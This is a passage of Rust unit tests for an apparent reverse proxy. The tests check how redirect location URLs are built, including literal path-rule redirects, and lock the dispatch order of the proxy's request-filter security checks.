        "https://new.example.com/",
        "/docs/v2",
        Some("ref=changelog"),
        false,
    );
    assert_eq!(loc, "https://new.example.com/docs/v2?ref=changelog");
}

#[test]
fn redirect_location_route_level_trims_trailing_slash_once() {
    let loc = build_redirect_location("https://new.example.com/", "/a", None, false);
    assert_eq!(loc, "https://new.example.com/a");
}

#[test]
fn redirect_location_path_rule_is_literal() {
    // Path rule redirect_to: operator set the exact destination for
    // this matched path. The request path must not be appended,
    // otherwise a target like ".../?q=https://host/" would receive
    // the matched path concatenated after it (the Plex /tesla bug).
    let loc = build_redirect_location(
        "https://www.youtube.com/redirect?q=https://plex.rwx-g.fr/",
        "/tesla",
        None,
        true,
    );
    assert_eq!(
        loc,
        "https://www.youtube.com/redirect?q=https://plex.rwx-g.fr/"
    );
}

#[test]
fn redirect_location_path_rule_literal_ignores_query_too() {
    // Literal redirects must also ignore the client's query string:
    // the operator's target is authoritative.
    let loc = build_redirect_location("https://example.com/final", "/src", Some("utm=x"), true);
    assert_eq!(loc, "https://example.com/final");
}

/// Story 8.1 AC #8 dispatch order regression pin.
///
/// Locks the `request_filter` -> `request_body_filter` call sequence
/// across the 16 `self.check_<name>(...)` sites in `proxy_wiring.rs`.
/// A future refactor that reorders, drops, or renames a helper fails
/// this test with a clear message naming the regression.
///
/// Closes the QA review VERIFY-001 concern : the source-level parity
/// check used at Story 8.1 closure becomes a mechanical CI gate
/// instead of a one-shot review artifact.
///
/// If you intentionally change the order (e.g. to fix a security
/// ordering bug), update `EXPECTED` below in the same commit and
/// document the rationale in CHANGELOG.md `[Unreleased]`.
#[test]
fn dispatch_order_locked() {
    const SOURCE: &str = include_str!("../proxy_wiring.rs");

    // Canonical dispatch order. The first 15 fire in `request_filter`
    // (top-down), `waf_body_filter` fires in `request_body_filter`.
    // Order matches the Story 8.1 epic PRD (AC #8) and the CHANGELOG
    // `[Unreleased]` AC #8 verification entry.
    const EXPECTED: &[&str] = &[
        "global_connection_limit",
        "ip_banned",
        "ip_blocked",
        "websocket_disabled",
        "token_bucket_rate_limit",
        "mtls",
        "forward_auth",
        "maintenance_mode",
        "return_status",
        "ip_allow_deny",
        "geoip",
        "slowloris",
        "route_conn_limit",
        "legacy_rate_limit",
        "waf_request_filter",
        "waf_body_filter",
    ];

    let actual: Vec<&str> = SOURCE
        .lines()
        .filter_map(|line| {
            let idx = line.find("self.check_")?;
            // Skip comment lines that mention `self.check_X` in prose.
            if line[..idx].trim_start().starts_with("//") {
                return None;
            }
            let after = &line[idx + "self.check_".len()..];
            // Identifier ends at the first non-`[A-Za-z0-9_]` char.
            let end = after
                .find(|c: char| !c.is_alphanumeric() && c != '_')
                .unwrap_or(after.len());
            // Reject if the identifier is not immediately followed by
            // an opening paren (filters out documentation references
            // like "the check_foo helper" and trait-object field
            // accesses if any sneak in later).
            if !after[end..].starts_with('(') {
                return None;
            }
            Some(&after[..end])
        })
        .collect();

    assert_eq!(
        actual, EXPECTED,
        "Story 8.1 AC #8 dispatch order regression : the request_filter / \
         request_body_filter pipeline in proxy_wiring.rs reordered, dropped, \
         renamed, or added a check_<name> helper. Expected : {EXPECTED:?}. \
         Actual : {actual:?}. If the change is intentional, update EXPECTED \
         in this test in the same commit and document the rationale in \
         CHANGELOG.md [Unreleased]."
    );
}
